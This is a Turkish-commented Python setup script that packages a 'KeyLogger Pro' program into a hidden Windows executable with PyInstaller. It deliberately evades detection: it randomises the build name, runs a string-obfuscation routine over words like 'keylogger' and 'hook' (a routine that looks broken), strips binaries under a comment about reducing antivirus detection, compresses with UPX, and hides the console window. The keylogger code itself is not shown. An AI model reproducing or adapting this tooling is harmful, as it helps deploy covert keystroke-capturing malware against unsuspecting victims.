#!/usr/bin/env python3
"""
KeyLogger Pro - Setup Script
Programı exe haline getirmek için kullanılır.

Kullanım:
    python setup.py build    # Programı exe haline getirir
    python setup.py clean    # Gereksiz dosya ve klasörleri temizler
"""

import os
import sys
import shutil
import subprocess
import random
import string
import time
import base64
import hashlib

def generate_random_name(length=8):
    """Rastgele bir isim oluştur."""
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def generate_random_bytes(length=32):
    """Rastgele bytes oluştur."""
    return os.urandom(length)

def obfuscate_strings():
    """Bazı hassas string'leri gizle."""
    # Gizlenecek string'ler
    strings_to_obfuscate = [
        "keyboard", "keylogger", "pynput", "monitor", "logger", "log", "key",
        "system", "track", "input", "record", "capture", "hook"
    ]
    
    # Gizleme fonksiyonu
    def obfuscate(s):
        # String'i karıştır ve base64 ile kodla
        salt = generate_random_bytes(16)
        key = hashlib.pbkdf2_hmac('sha256', s.encode(), salt, 100000)
        encoded = base64.b64encode(key).decode()
        return f"'{encoded}'"
    
    # Gizlenmiş string'leri döndür
    return {s: obfuscate(s) for s in strings_to_obfuscate}

def clean_build_files():
    """Derleme dosyalarını temizle."""
    print("Gereksiz dosya ve klasörler temizleniyor...")
    
    # Mevcut dizini al
    current_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Temizlenecek klasörler
    dirs_to_clean = [
        os.path.join(current_dir, "build"),
        os.path.join(current_dir, "__pycache__"),
    ]
    
    # src ve tools klasörlerindeki __pycache__ klasörlerini ekle
    for subdir in ["src", "tools"]:
        pycache_dir = os.path.join(current_dir, subdir, "__pycache__")
        if os.path.exists(pycache_dir):
            dirs_to_clean.append(pycache_dir)
    
    # Temizlenecek dosyalar
    files_to_clean = [
        os.path.join(current_dir, "*.spec"),
        os.path.join(current_dir, "*.pyc"),
        os.path.join(current_dir, "*.pyo"),
    ]
    
    # Klasörleri temizle
    for dir_path in dirs_to_clean:
        if os.path.exists(dir_path):
            try:
                shutil.rmtree(dir_path)
                print(f"Silindi: {dir_path}")
            except Exception as e:
                print(f"Hata: {dir_path} silinemedi - {str(e)}")
    
    # Dosyaları temizle
    for file_pattern in files_to_clean:
        try:
            # Eğer wildcard içeriyorsa
            if "*" in file_pattern:
                import glob
                for file_path in glob.glob(file_pattern):
                    os.remove(file_path)
                    print(f"Silindi: {file_path}")
            # Normal dosya
            elif os.path.exists(file_pattern):
                os.remove(file_pattern)
                print(f"Silindi: {file_pattern}")
        except Exception as e:
            print(f"Hata: {file_pattern} silinemedi - {str(e)}")
    
    print("Temizlik tamamlandı.")

def build_exe():
    """Programı exe haline getir."""
    try:
        # PyInstaller'ın yüklü olup olmadığını kontrol et
        try:
            import PyInstaller
        except ImportError:
            print("PyInstaller yüklü değil. Yükleniyor...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        
        # Mevcut dizini al
        current_dir = os.path.dirname(os.path.abspath(__file__))
        
        # Derleme klasörünü temizle
        build_dir = os.path.join(current_dir, "build")
        dist_dir = os.path.join(current_dir, "dist")
        
        if os.path.exists(build_dir):
            shutil.rmtree(build_dir)
        if os.path.exists(dist_dir):
            shutil.rmtree(dist_dir)
        
        # Rastgele bir exe adı oluştur
        exe_name = generate_random_name()
        final_exe_name = "KeyLoggerPro.exe"
        
        # Versiyon bilgisi dosyasının yolunu al
        version_file = os.path.join(current_dir, "file_version_info.txt")
        
        # Geçici bir spec dosyası oluştur
        spec_content = f"""
# -*- mode: python ; coding: utf-8 -*-

import sys
import os
from PyInstaller.building.build_main import Analysis, PYZ, EXE, COLLECT
from PyInstaller.utils.win32.versioninfo import VSVersionInfo, FixedFileInfo, StringFileInfo, StringTable, StringStruct, VarFileInfo, VarStruct

# Gizleme işlemleri
{obfuscate_strings()}

# Rastgele değişken isimleri
a = Analysis(
    [os.path.join(r'{current_dir}', 'start.py')],
    pathex=[r'{current_dir}'],
    binaries=[],
    datas=[(r'{os.path.join(current_dir, "config.ini")}', '.')],
    hiddenimports=['win32gui', 'win32con', 'win32api', 'pynput.keyboard._win32', 'cryptography'],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=['tkinter', 'unittest', '_tkinter', 'test'],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=None,
    noarchive=False,
)

# Antivirüs tespitini azaltmak için ek ayarlar
a.binaries = [x for x in a.binaries if not x[0].startswith('api-ms-win')]

pyz = PYZ(
    a.pure,
    a.zipped_data,
    cipher=None
)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='{exe_name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    version=r'{version_file}',
    uac_admin=False,
    icon=None  # İkon istenirse buraya eklenebilir
)
"""
        
        # Spec dosyasını kaydet
        spec_file = os.path.join(current_dir, f"{exe_name}.spec")
        with open(spec_file, 'w') as f:
            f.write(spec_content)
        
        # Spec dosyasını kullanarak exe oluştur
        print("Program derleniyor...")
        subprocess.check_call([
            sys.executable, "-m", "PyInstaller",
            "--clean",  # Temiz derleme
            spec_file
        ])
        
        # Exe dosyasını yeniden adlandır
        temp_exe_path = os.path.join(dist_dir, f"{exe_name}.exe")
        final_exe_path = os.path.join(dist_dir, final_exe_name)
        
        if os.path.exists(temp_exe_path):
            # Exe dosyasını yeniden adlandır
            os.rename(temp_exe_path, final_exe_path)
            
            # Gereksiz dosyaları temizle
            clean_build_files()
            
            print("\nProgram başarıyla derlendi!")
            print(f"Exe dosyası: {final_exe_path}")
        else:
            print(f"Hata: Exe dosyası oluşturulamadı: {temp_exe_path}")
            return 1
        
        return 0
    except Exception as e:
        print(f"Hata: {str(e)}")
        return 1

def main():
    """Ana fonksiyon."""
    if len(sys.argv) < 2:
        print("Kullanım: python setup.py [build|clean]")
        return 1
    
    command = sys.argv[1].lower()
    
    if command == "build":
        return build_exe()
    elif command == "clean":
        clean_build_files()
        return 0
    else:
        print(f"Bilinmeyen komut: {command}")
        print("Kullanım: python setup.py [build|clean]")
        return 1

if __name__ == "__main__":
    sys.exit(main()) 